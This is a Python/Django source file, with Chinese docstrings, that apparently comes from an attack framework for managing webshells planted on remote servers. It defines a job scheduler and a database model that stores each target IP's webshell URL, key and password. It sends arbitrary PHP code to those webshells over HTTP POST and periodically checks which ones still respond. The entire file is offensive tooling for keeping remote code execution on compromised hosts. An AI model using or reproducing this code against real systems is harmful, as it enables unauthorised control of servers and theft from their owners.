from apscheduler.schedulers.background import BackgroundScheduler
from django_apscheduler.jobstores import DjangoJobStore, register_events
from django.conf import settings
from django.db import models
from django.contrib import admin
import requests
from .webshell import Webshell

class Scheduler(BackgroundScheduler):
    def __init__(self):
        super().__init__(timezone=settings.TIME_ZONE)
        self.add_jobstore(DjangoJobStore(), "default")
        register_events(self)

    def add_job(self, func, id=None, seconds=3, minutes=None):
        if minutes:
            return super().add_job(func=func,trigger="interval",replace_existing=True,id=id,minutes=minutes)
        return super().add_job(func=func,trigger="interval",replace_existing=True,id=id,seconds=seconds)

    def add_jobs(self,func_list:list,seconds=3, minutes=None):
        ids_exsisted = [job.id for job in self.get_jobs()]
        ids = [func_id[1] for func_id in func_list]
        for id in ids_exsisted:
            if id not in ids:
                self.remove_job(job_id=id)
        for func_id in func_list:
            func = func_id[0]
            id = func_id[1]
            self.add_job(func=func,id=id,seconds=seconds,minutes=minutes)

class WebshellModel(models.Model):
    ip = models.CharField(max_length=0xff)
    webshell_url = models.CharField(max_length=0xff)
    webshell_key = models.CharField(max_length=0xff)
    webshell_passwd = models.CharField(max_length=0xff)
    available = models.BooleanField(default=True)
    class Meta:
        abstract=True
    @classmethod
    def register(cls):
        """将model注册到admin后台,不注册后台看不到"""
        admin.site.register(cls)
    @classmethod
    def unregister(cls):
        """取消注册"""
        admin.site.unregister(cls)

    @classmethod
    def init(cls,ip=None,url=None,key=None,passwd=None):
        """用来生成object"""
        return cls(ip=ip,webshell_url=url,webshell_key=key,webshell_passwd=passwd,available=True)
    
    @classmethod
    def update(cls,ip=None,url=None,key=None,passwd=None):
        """更新或添加webshell信息到数据库"""
        if len(cls.objects.filter(ip=ip)) == 0:
            o = cls.init(ip=ip,url=url,key=key,passwd=passwd)
            o.save()
        else:
            cls.objects.filter(ip=ip).update(webshell_url=url,webshell_key=key,webshell_passwd=passwd)

    @classmethod
    def eval(cls,ip,code) -> requests.Response:
        """通过ip对应的webshell,执行php代码"""
        o = cls.objects.filter(ip=ip)[0]
        url = o.webshell_url
        data = {
            "passwd" : o.webshell_passwd,
            o.webshell_key:code
        }
        return requests.post(url=url,data=data)

    @classmethod
    def test_available_and_eval(cls,ip,code):
        """先判断webshell是否可以访问,然后再运行代码"""
        if cls.test_available(ip):
            resp = cls.eval(ip,code)
            return resp
        else:
            return None

    @classmethod
    def test_available(cls,ip):
        """判断webshell是否可以访问"""
        o = cls.objects.filter(ip=ip)[0]
        key = Webshell.get_random_string(8)
        code = f"echo '{key}';"
        resp = cls.eval(ip,code)
        if key in resp.text:
            o.available = True
            a = True
        else:
            o.available = False
            a = False
        o.save()
        return a

    @classmethod
    def update_and_test_available(cls,ip=None,url=None,key=None,passwd=None):
        """更新、添加webshell信息,并判断这个webshell能否访问"""
        cls.update(ip=ip,url=url,key=key,passwd=passwd)
        return cls.test_available(ip=ip)


    @classmethod
    def webshell_message(cls,ip):
        """返回webshell信息"""
        o = cls.objects.filter(ip=ip)[0]
        return str(o)

    def __str__(self):
        if self.available:
            return f"{str(self.webshell_url)}?passwd={str(self.webshell_passwd)}&{str(self.webshell_key)}=phpinfo();"
        else:
            return f"{self.ip} , is not available [!] "
